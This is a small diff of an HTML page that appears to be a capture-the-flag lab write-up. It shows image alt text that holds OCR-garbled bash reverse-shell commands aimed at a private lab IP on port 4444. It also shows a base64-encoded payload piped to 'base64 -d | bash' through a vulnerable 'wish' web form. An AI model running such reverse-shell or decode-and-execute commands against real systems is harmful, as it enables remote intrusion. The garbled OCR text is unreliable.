@@ -20,7 +20,7 @@
 
 <img src="diginn/media/image9.png" style="width:4.29167in;height:3.95in" alt="sh •i /dev/tcp/192.168.43.2e8/4444 0&gt;81 Output c2ggLwkgPiYgL2R1di9eY3AvNTkyLjE20C4ØMy4yYDgvNDQeNCAwpiYx " />
 
-echo "payload" | base64 -d | bash
+<p>echo "payload" | base64 -d | bash</p>
 
 <img src="diginn/media/image10.png" style="width:4.40833in;height:2.40833in" alt="O a 192.168.43.219:7331/wish Google Hacking DB Vigenere Solver - ww... LxdPrivi1ege Escalari.- Oh you found me then go on make a wish. This can make all your wishes come true Execute: •ONCAwPiYxlbase64-dlbash " />
 
